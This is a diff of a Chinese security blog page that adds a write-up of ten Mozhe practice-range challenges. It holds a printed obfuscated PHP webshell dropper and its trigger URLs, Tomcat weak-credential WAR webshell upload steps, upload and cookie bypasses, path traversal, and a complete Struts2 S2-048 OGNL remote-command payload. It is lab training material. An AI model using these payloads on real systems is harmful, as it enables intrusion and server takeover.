@@ -202,11 +202,11 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-Ruby On Rails漏洞复现第一题" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-靶场复盘" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/04/04/Ruby On Rails漏洞复现第一题/" class="article-date">
-      <time datetime="2020-04-03T16:00:00.000Z" itemprop="datePublished">2020-04-04</time>
+      <a href="/2020/04/08/靶场复盘/" class="article-date">
+      <time datetime="2020-04-08T01:26:46.000Z" itemprop="datePublished">2020-04-08</time>
 </a>
 
     </div>
@@ -216,43 +216,117 @@
       <input type="hidden" class="isFancy">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/04/Ruby On Rails漏洞复现第一题/">Ruby On Rails漏洞复现第一题</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
     <div class="article-entry" itemprop="articleBody">
       
           
-              <p>Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。
-          
+        <p>第一题：HTML前端代码分析</p>
+<p>访问后发现没有交互点 目录扫描也什么都没有。。。<br><img src="http://picture.mzxh.xyz/20200407210332.png" alt><br>尝试查看源代码<br><img src="http://picture.mzxh.xyz/20200407210459.png" alt><br>发现有一个php文件，但是访问不到这个IP地址，于是尝试直接访问靶机IP+文件名<br><img src="http://picture.mzxh.xyz/20200407210636.png" alt><br>获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/ZlNHTFFtWHV1cTNXb083eG9SS0hUZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/ZlNHTFFtWHV1cTNXb083eG9SS0hUZz09bW96aGUmozhe</a></p>
+<p>第二题：画网络</p>
+<p><img src="http://picture.mzxh.xyz/20200407212653.png" alt></p>
+<p>根据第一题的习惯，直接查看下源代码</p>
+<p><img src="http://picture.mzxh.xyz/20200407212728.png" alt></p>
+<p>发现漏洞编号CVE-2016-3081对应st2-032,直接上漏洞工具</p>
+<p><img src="http://picture.mzxh.xyz/20200407212916.png" alt><br><img src="http://picture.mzxh.xyz/20200407213045.png" alt></p>
+<p>获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/NWZ1OHFUbDgxV3JNdDhMa0RHQ3BnZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/NWZ1OHFUbDgxV3JNdDhMa0RHQ3BnZz09bW96aGUmozhe</a></p>
+<p>第三题：st2-004</p>
+<p><img src="http://picture.mzxh.xyz/20200407213240.png" alt><br>直接提示漏洞是st2-004</p>
+<p>s2-004 是一个目录遍历漏洞</p>
+<p>我们对../ 进行二次编码为..%252f 然后构建url去访问</p>
+<p><img src="http://picture.mzxh.xyz/20200407213521.png" alt></p>
+<p>获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/WXlXKzdpMHpjZ0JCY1NXdzRUMkhwUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/WXlXKzdpMHpjZ0JCY1NXdzRUMkhwUT09bW96aGUmozhe</a></p>
+<p>第四题：webshell分析</p>
+<p><img src="http://picture.mzxh.xyz/20200407213747.png" alt></p>
+<p>给了shell地址，下载回来看看</p>
+<p><img src="http://picture.mzxh.xyz/20200407213827.png" alt></p>
+<p>分析一下代码，若get到的1不为空且1=GET.fPZ87的话执行创建t.php并写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_ = str_replace(&apos;ilo&apos;, &apos;ass&apos;, str_replace(&apos;vey&apos;, &apos;ert&apos;, $_GET[2]));@$_($_POST[1]);</span><br></pre></td></tr></table></figure>
+<p>将$GET_[2]接收到的值中的vey替换为ert，ilo替换为ass，也是时候当2=ilovey是，构成assert($_POST[1])，密码为1的一句话，生成的t.php文件是一个webshell</p>
+<p>所以先访问http://<strong><em>.</em></strong>.<strong><em>.</em></strong>:49268/include/mysql_conn.php?1=GET.fPZ87  写入一句话t.php</p>
+<p>然后访问http://<strong><em>.</em></strong>.<strong><em>.</em></strong>:49268/include/t.php?2=ilovey</p>
+<p>直接菜刀连接 找到key</p>
+<p><img src="http://picture.mzxh.xyz/20200407214819.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/L3dtcFZpT0lXbVMrRW1GQzUxSTJlZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/L3dtcFZpT0lXbVMrRW1GQzUxSTJlZz09bW96aGUmozhe</a></p>
+<p>第五题：Tomcat弱口令</p>
+<p>看到tomcat后猜测是否存在弱口令，尝试admin/123456后成功登入</p>
+<p><img src="http://picture.mzxh.xyz/20200407215201.png" alt></p>
+<p>尝试上传war大马，（war大马就找一个jsp的大马，然后压缩为zip，再把后缀改为war就可以。这里卡了我好久。。。都是压缩为rar然后改的后缀，死活执行不起来）</p>
+<p>选择List Applications</p>
+<p><img src="http://picture.mzxh.xyz/20200407220400.png" alt></p>
+<p>上传后会自动解压出文件夹</p>
+<p><img src="http://picture.mzxh.xyz/20200407220340.png" alt></p>
+<p>直接访问大马 在服务器根目录获取到key</p>
+<p><img src="http://picture.mzxh.xyz/20200407220532.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/N3U3NER2eHVmQjgvQndWWTNPS1NZUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/N3U3NER2eHVmQjgvQndWWTNPS1NZUT09bW96aGUmozhe</a></p>
+<p>第六题：cms漏洞</p>
+<p>访问后发现是一个cms</p>
+<p><img src="http://picture.mzxh.xyz/20200407220749.png" alt></p>
+<p>百度搜了一下 这个版本有一个cookie欺骗</p>
+<p><img src="http://picture.mzxh.xyz/20200407221752.png" alt></p>
+<p>直接用cookie添加一个admin_name参数 值随意</p>
+<p><img src="http://picture.mzxh.xyz/20200407221841.png" alt></p>
+<p>然后访问admin/cms_admin.php页面</p>
+<p>在页面最底部找到key值</p>
+<p><img src="http://picture.mzxh.xyz/20200407222000.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/VkFCM3lXb0t5dFBNNkVLQVlvbFltQT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/VkFCM3lXb0t5dFBNNkVLQVlvbFltQT09bW96aGUmozhe</a></p>
+<p>第七题：伪造来源</p>
+<p><img src="http://picture.mzxh.xyz/20200407222452.png" alt></p>
+<p>提示只允许Google访问，判断是伪造来源</p>
+<p>直接抓包把Referer修改为<a href="http://google.com" target="_blank" rel="noopener">http://google.com</a></p>
+<p><img src="http://picture.mzxh.xyz/20200407222723.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/Y3pLcmdDUWhUQWwwMjRFTytzSVRkUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/Y3pLcmdDUWhUQWwwMjRFTytzSVRkUT09bW96aGUmozhe</a></p>
+<p>第八题：Wireshark分析</p>
+<p><img src="http://picture.mzxh.xyz/20200407222846.png" alt></p>
+<p>直接把包下载回来本地打开</p>
+<p>因为说是访问过一句话木马，所以直接搜.php文件</p>
+<p><img src="http://picture.mzxh.xyz/20200407223113.png" alt></p>
+<p>找到了一句话木马</p>
+<p>key就是一句话的木马，拿回靶场验证</p>
+<p><img src="http://picture.mzxh.xyz/20200407223137.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/VUlJNlhUbytOejlkL0pUVkt2UmVSUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/VUlJNlhUbytOejlkL0pUVkt2UmVSUT09bW96aGUmozhe</a></p>
+<p>第九题：文件上传</p>
+<p><img src="http://picture.mzxh.xyz/20200407224515.png" alt></p>
+<p>提示文件上传</p>
+<p>用御剑扫描一下目录</p>
+<p><img src="http://picture.mzxh.xyz/20200407224628.png" alt></p>
+<p>找到上传页面，尝试访问</p>
+<p><img src="http://picture.mzxh.xyz/20200407224654.png" alt></p>
+<p>是一个javascript弹窗，</p>
+<p><img src="http://picture.mzxh.xyz/20200407224841.png" alt></p>
+<p>抓包删除这段javascript</p>
+<p><img src="http://picture.mzxh.xyz/20200407225114.png" alt></p>
+<p>上传后发现没有回显路径，重新梳理后发现代码路径写在了/upload1.php页面上，把Cookie中的uploadmd5值修改为upload_file.php</p>
+<p><img src="http://picture.mzxh.xyz/20200407225636.png" alt></p>
+<p>可以看到上传后的路径为uploadfile 文件名修改为日期<em>verify值</em>文件名</p>
+<p><img src="http://picture.mzxh.xyz/20200407230449.png" alt></p>
+<p>构造一下</p>
+<p><strong><em>.</em></strong>.<strong><em>.</em></strong>:43745/admin/uploadfile/20200407_0b950d1f78593086_picture.php</p>
+<p><img src="http://picture.mzxh.xyz/20200407230712.png" alt></p>
+<p>菜刀连接，根目录获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/TzRsdjFSYW9HQlA2OFdGbXo0KzBUdz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/TzRsdjFSYW9HQlA2OFdGbXo0KzBUdz09bW96aGUmozhe</a></p>
+<p>第十题：struts2-048</p>
+<p>访问Integration/Struts 1 Integration：</p>
+<p><img src="http://picture.mzxh.xyz/20200408004148.png" alt></p>
+<p>在Gangster Name处构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://picture.mzxh.xyz/20200408004256.png" alt></p>
+<p>看到有回显 执行了ID命令 </p>
+<p>修改poc把id改成ls<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ls&apos;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>回显看到key.txt文件</p>
+<p><img src="http://picture.mzxh.xyz/20200408004412.png" alt></p>
+<p>继续修改poc 执行cat命令 </p>
+<p><img src="http://picture.mzxh.xyz/20200408004533.png" alt></p>
+<p>获取到key</p>
+
       
-    </p></div>
+    </div>
     
     <div class="article-info article-info-index">
       
       
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/墨者靶场/">墨者靶场</a>
-    </div>
-
 
       
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2020/04/04/Ruby On Rails漏洞复现第一题/#more">查看全文 >></a>
-        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -322,6 +396,76 @@
       
         <p class="article-more-link">
           <a href="/2020/04/04/uWSGI 漏洞复现（CVE-2018-7490）/#more">查看全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Ruby On Rails漏洞复现第一题" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/04/04/Ruby On Rails漏洞复现第一题/" class="article-date">
+      <time datetime="2020-04-03T16:00:00.000Z" itemprop="datePublished">2020-04-04</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/04/Ruby On Rails漏洞复现第一题/">Ruby On Rails漏洞复现第一题</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。
+          
+      
+    </p></div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/墨者靶场/">墨者靶场</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2020/04/04/Ruby On Rails漏洞复现第一题/#more">查看全文 >></a>
         </p>
       
       <div class="clearfix"></div>
@@ -812,76 +956,6 @@
       
         <p class="article-more-link">
           <a href="/2019/12/22/安装防爆破/#more">查看全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-修改ssh端口" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/12/22/修改ssh端口/" class="article-date">
-      <time datetime="2019-12-21T16:00:00.000Z" itemprop="datePublished">2019-12-22</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/22/修改ssh端口/">添加或修改ssh服务的端口</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>ssh远程登录的默认端口是22，建议修改默认端口防止被恶意爆破登入<br>
-          
-      
-    </p></div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/linux/">linux</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2019/12/22/修改ssh端口/#more">查看全文 >></a>
         </p>
       
       <div class="clearfix"></div>
